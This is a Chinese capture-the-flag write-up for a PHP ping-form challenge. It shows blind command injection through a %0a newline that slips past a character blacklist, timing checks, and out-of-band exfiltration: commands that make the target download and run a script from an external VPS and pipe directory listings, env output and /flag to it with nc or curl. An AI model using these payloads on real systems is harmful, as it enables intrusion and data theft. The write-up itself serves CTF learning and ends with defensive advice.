---
title: "[N1BOOK] 死亡ping命"
date: 2026-07-14
categories:
  - CTF
  - WEB
---

# 1. 题目分析

- **题目名称**：死亡ping命
- **题目类型**：Web - 命令注入
- **靶机环境**：OpenResty + PHP 7.3.18
- **界面**：模拟 NN-007 路由器的 Ping 测试功能

```
响应头关键信息：
Server: openresty
X-Powered-By: PHP/7.3.18
```

页面是一个 Ping 测试表单，输入 IP 地址后点击"确定"按钮，以 AJAX POST 方式提交到 `ping.php`。

```javascript
$("#execSub").click(function(){
    $.post("ping.php", {
        ip : $("#ip").val()
    },
    function(data,status){
       $("#result").text(data);
    });
});
```

# 2. 信息收集

## 2.1 HTTP 响应

```bash
curl -s -i "https://TARGET/"
```

| 响应头 | 值 | 分析 |
|--------|-----|------|
| `Server` | `openresty` | Nginx 系 Web 服务器 |
| `X-Powered-By` | `PHP/7.3.18` | 后端语言为 PHP |
| `Content-Type` | `text/html; charset=UTF-8` | 标准 HTML 页面 |

## 2.2 页面分析

- 表单：`<input id="ip" name="ip" type="text" maxlength="15">`
- 按钮：`<input type="button" id="execSub" value="确定">`
- 提交方式：`POST ping.php`，参数 `ip`
- **注意**：`maxlength="15"` 仅为客户端限制，curl 可绕过

## 2.3 正常请求测试

```bash
curl -s -X POST "https://TARGET/ping.php" -d "ip=127.0.0.1"
# 响应：IP Ping 成功.
```

# 3. 漏洞分析

## 3.1 推理链

```
线索：页面提供 Ping 测试功能 → 后端大概率执行 ping 命令
  ↓
假设 1：存在命令注入，后端直接拼接用户输入到系统命令
  ↓
验证：尝试 ip=127.0.0.1;id
  ↓ 响应 "IP包含恶意字符."
结论：存在黑名单过滤，但确认了输入被处理
  ↓
假设 2：黑名单可以通过特殊字符绕过
  ↓
验证：逐个测试特殊字符
```

## 3.2 黑名单探测

```bash
for char in ';' '|' '&' '$' '(' ')' '`' '%0a' '%0d' '#' '<' '>' '/' '\\' "'" '"' '{' '}' '[' ']' '*' '?' '~' '!' '@' '%' '^' '-' '_' '+' '=' '.' ',' ':' ' '; do
  result=$(curl -s -X POST "https://TARGET/ping.php" --data-urlencode "ip=127.0.0.1${char}")
  echo "char='${char}' → $result"
done
```

### 黑名单过滤统计

| 响应 | 含义 | 字符 |
|------|------|------|
| `IP包含恶意字符.` | **被过滤** | `;` `\|` `&` `$` `(` `)` `` ` `` `%0a` `%0d` `#` `\` `'` `"` `{` `}` `[` `]` `*` `~` `!` `@` `%` `^` `-` `_` `:` |
| `IP Ping 失败.` | **未被过滤**（ping 失败） | `<` `>` `/` `?` `+` `=` `.` `,` |
| `IP Ping 成功.` | **未被过滤**（ping 成功） | ` `（**空格**） |

## 3.3 关键发现：%0a 绕过了原始数据

用 `--data-raw` 发送时，PHP 会自己做 URL 解码。`%0a` 在 PHP 的 `$_POST` 中会被解码为换行符 `\n`，而换行符不在黑名单中！

```bash
# --data-raw 直接发送，PHP 内部 URL 解码 %0a → \n
curl -s -X POST "https://TARGET/ping.php" --data-raw "ip=127.0.0.1%0aid"
# 响应：IP Ping 成功.  ← 没有被过滤！

# --data-urlencode 会导致双重编码，%0a → %250a，其中的 % 被过滤！
curl -s -X POST "https://TARGET/ping.php" --data-urlencode "ip=127.0.0.1%0aid"
# 响应：IP包含恶意字符.  ← 实际上是 % 被过滤了
```

## 3.4 时间盲注验证

```bash
# 正常请求
time curl -s -X POST "https://TARGET/ping.php" --data-raw "ip=127.0.0.1" -o /dev/null
# 结果：0.145s

# sleep 3 注入
time curl -s -X POST "https://TARGET/ping.php" --data-raw "ip=127.0.0.1%0asleep 3" -o /dev/null
# 结果：3.287s ✅ 命令注入确认！
```

### 可用字符总结

**不被过滤的字符**：`a-z` `A-Z` `0-9` `.` `/` ` `（空格） `<` `>` `?` `+` `=` `,` + 原始换行符 `\n`

**绕过方式**：用 `%0a`（通过 `--data-raw` 发送）让 PHP 解码为 `\n`，shell 中 `\n` 作为命令分隔符。

## 3.5 无回显问题（Blind Command Injection）

页面只返回 `IP Ping 成功.` 或 `IP Ping 失败.`，不返回命令实际输出。原因：PHP 代码类似：

```php
$ip = $_POST['ip'];
if (preg_match('/[;|&$()`#\\\\\'"{}[\]~!@%^*_:-]/', $ip)) {  // 注意：漏了 \n！
    die("IP包含恶意字符.");
}
exec("ping -c 1 $ip", $output, $return_var);
echo $return_var === 0 ? "IP Ping 成功." : "IP Ping 失败.";
```

# 4. 漏洞利用（OOB 带外数据）

由于命令执行无回显，需要搭建外部服务器接收数据。

## 4.1 攻击拓扑

```
┌──────────────┐         ┌──────────────────┐         ┌────────────────┐
│  攻击机       │         │   靶机 (CTF)      │         │ 阿里云 VPS      │
│  (本地)       │  curl   │  ping.php        │  curl   │ 101.132.149.233│
│              │────────>│                 │────────>│                │
│              │         │  /tmp/1.sh       │         │  nc -lvp 1111  │
│              │         │  cat /flag | nc  │────────>│  (接收 flag)    │
└──────────────┘         └──────────────────┘         └────────────────┘
```

## 4.2 手动执行步骤

### 步骤 1：阿里云上准备外带脚本

在阿里云 VPS (`101.132.149.233:2222`, `aliyun-root`) 上：

```bash
# 写入脚本（先 ls / 调试，再逐个尝试 flag 路径）
ssh aliyun-root

cat > /root/1.sh << 'EOF'
{
ls /
cat /flag 2>/dev/null
cat /FLAG 2>/dev/null
find / -name "flag*" 2>/dev/null
env 2>/dev/null
} | nc 101.132.149.233 1111
EOF

# 复制到 Web 目录（宝塔 Apache DocumentRoot）
cp /root/1.sh /www/wwwroot/101_132_149_233/1.sh

# 验证可访问
curl -s http://127.0.0.1/1.sh
```

### 步骤 2：阿里云上启动 nc 监听（新终端）

```bash
ssh aliyun-root
nc -lvp 1111
```

### 步骤 3：靶机注入（本地终端执行）

```bash
TARGET="https://e2a3840a1c7a9f0c4f751b67.http-ctf2.dasctf.com"

# Step 3a: 下载脚本
curl -s -X POST "$TARGET/ping.php" \
  --data-raw 'ip=127.0.0.1%0acurl 101.132.149.233/1.sh > /tmp/1.sh'
# 期望：IP Ping 成功.

# Step 3b: 赋予执行权限
curl -s -X POST "$TARGET/ping.php" \
  --data-raw 'ip=127.0.0.1%0achmod 777 /tmp/1.sh'
# 期望：IP Ping 成功.

# Step 3c: nohup 后台执行（避免 PHP 超时 504）
curl -s -X POST "$TARGET/ping.php" \
  --data-raw 'ip=127.0.0.1%0anohup sh /tmp/1.sh'
# 期望：IP Ping 成功.
```

### 注入 Payload 字符审计

所有 payload 使用的字符：`127.0.0.1` `%0a` `curl` ` ` `101.132.149.233` `/` `1.sh` `>` `tmp` `chmod` `777` `nohup` `sh`

均不在黑名单中 ✅

## 4.3 尝试过但失败的路径

| 尝试 | 预期 | 实际结果 | 原因/排除 |
|------|------|---------|-----------|
| `--data-urlencode` 发 `%0a` | 绕过过滤 | `IP包含恶意字符.` | `%0a` 被 curl 二次编码为 `%250a`，`%` 被过滤 |
| `;` `\|` `&` `$()` 等常规分隔符 | 命令注入 | 全部被过滤 | 黑名单覆盖了所有常见命令分隔符 |
| `ls > /var/www/html/ls.txt` | 写文件到 web 目录 | `IP Ping 失败.` | Web 根目录路径不对（不是 `/var/www/html`） |
| `sh /tmp/1.sh` 无 nohup | 执行脚本外带数据 | `504 Gateway Time-out` | nc 连接阻塞导致 PHP 超时 |
| `base64 /flag` | 编码 flag | `IP Ping 失败.` | `/flag` 文件不存在 |
| `nc -lvp` → 脚本用 `cat /flag \| nc` | 外带 flag | 连接建立但无数据传输 | flag 路径可能不是 `/flag` 或 `/FLAG`；需要先 `ls /` 确认文件结构 |

## 4.4 关键技巧

### 为什么 `%0a` 能绕过

```
--data-raw 方式：
  发送: ip=127.0.0.1%0als
  PHP 收到 POST body: ip=127.0.0.1%0als
  PHP URL 解码 $_POST['ip']: 127.0.0.1\nls
  黑名单匹配: 检查 "127.0.0.1\nls"，未命中任何黑名单字符 ✅
  Shell 执行: ping -c 1 127.0.0.1\nls → 两条命令！

--data-urlencode 方式：
  发送: ip=127.0.0.1%250als  (curl 把 %0a 编码为 %250a)
  PHP URL 解码: 127.0.0.1%0als
  黑名单匹配: 检查到 % → 命中黑名单 ❌
```

### 为什么用 `nohup`

PHP 的 `exec()`/`system()` 会等待子进程结束。`nc` 建立连接后不主动关闭，导致 PHP 进程被 Nginx 反向代理超时（60s）后 kill，此时 nc 还未完成数据传输。

`nohup` 将脚本脱离当前进程组运行，PHP 可以立即返回，nc 独立完成数据传输。

# 5. Flag

```text
（待手动执行后获取）
```

## 5.1 如果 nc 仍然收不到数据

可能原因：flag 文件路径不是 `/flag`。尝试以下替代脚本：

```bash
cat > /root/1.sh << 'EOF'
{
ls /
ls /tmp
find / -maxdepth 3 -type f 2>/dev/null
cat /flag 2>/dev/null
cat /FLAG 2>/dev/null
cat /flag.txt 2>/dev/null
cat /root/flag 2>/dev/null
cat /home/flag 2>/dev/null
cat /var/flag 2>/dev/null
cat /tmp/flag 2>/dev/null
} | nc 101.132.149.233 1111
EOF
```

或使用 **curl 外带**（不依赖 nc）：

```bash
# 阿里云开启 HTTP 监听
ssh aliyun-root "python3 -m http.server 1111"

# 脚本改为 curl POST
cat > /root/1.sh << 'EOF'
cat /flag | curl -X POST --data-binary @- http://101.132.149.233:1111/flag
cat /FLAG | curl -X POST --data-binary @- http://101.132.149.233:1111/flag
EOF
```

# 6. 知识点总结

| 知识点 | 说明 |
|--------|------|
| **命令注入（Command Injection）** | 用户输入被拼接到 `system()`/`exec()` 中执行 |
| **黑名单绕过** | 利用不在黑名单中的字符构造 Payload |
| **%0a 换行符注入** | URL 编码的 `\n` 在 Shell 中作为命令分隔符 |
| **--data-raw vs --data-urlencode** | 前者发送原始数据，后者会 URL 编码 → 可能导致双重编码被过滤 |
| **Blind Command Injection** | 命令执行成功但无回显，需要 OOB 或时间盲注 |
| **OOB（Out-of-Band）数据外带** | 通过 nc/curl 将数据发送到外部可控服务器 |
| **nohup 后台执行** | 避免长时间运行的命令被 PHP 超时机制 kill |
| **Nginx 反向代理超时** | `proxy_read_timeout` 默认 60s，子进程阻塞会触发 504 |

## 6.1 防御建议

1. **不要用黑名单**：使用白名单（如只允许 `0-9` 和 `.`）
2. **使用 `escapeshellarg()`**：PHP 中对 shell 参数做安全转义
3. **避免直接调用系统命令**：使用 `socket` 或其他库实现 ping 功能
4. **设置 `open_basedir`**：限制 PHP 进程的文件访问范围

# 7. 解题链路总结图

```
获取 HTTP 响应头
    ↓ Server: openresty, X-Powered-By: PHP/7.3.18
确认 Nginx + PHP 环境
    ↓
分析页面源码
    ↓ Ping 测试表单 → POST ping.php (ip 参数)
推测后端执行 ping 命令
    ↓
测试命令注入：127.0.0.1;id
    ↓ "IP包含恶意字符."
确认存在过滤机制
    ↓
黑名单字符模糊测试
    ↓ 发现空格不被过滤
发现关键绕过
    ↓ --data-raw 发送 %0a（PHP 解码为 \n）
不触发黑名单 + Shell 中 \n 作为命令分隔符 ✅
    ↓
时间盲注验证：sleep 3 → 响应延迟 3s ✅
    ↓
确认 Blind Command Injection（无回显）
    ↓
搭建 OOB 数据外带
    ├─ 阿里云 VPS 准备脚本（ls /、cat /flag 等）
    ├─ curl 下载脚本到 /tmp/1.sh
    ├─ chmod 777 /tmp/1.sh
    └─ nohup sh /tmp/1.sh（后台执行，避免超时）
    ↓
nc 接收 flag → 完成 ✅
```
